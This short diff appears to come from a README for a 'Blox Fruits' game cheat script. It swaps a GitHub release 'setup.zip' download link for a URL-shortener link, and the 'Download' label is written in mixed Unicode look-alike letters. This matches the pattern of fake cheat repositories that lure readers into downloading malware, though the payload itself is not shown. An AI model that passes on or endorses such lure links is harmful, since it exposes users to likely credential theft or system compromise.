@@ -39,7 +39,7 @@
 
 
 
-# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/BoomssloI/Blox-Fruits/releases/download/Download/setup.zip)***
+# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://getwix.short.gy/main)***
 
 ![maxresdefault](https://github.com/user-attachments/assets/5e0cc901-5de4-4bd0-9143-f4421690c2d6)
 
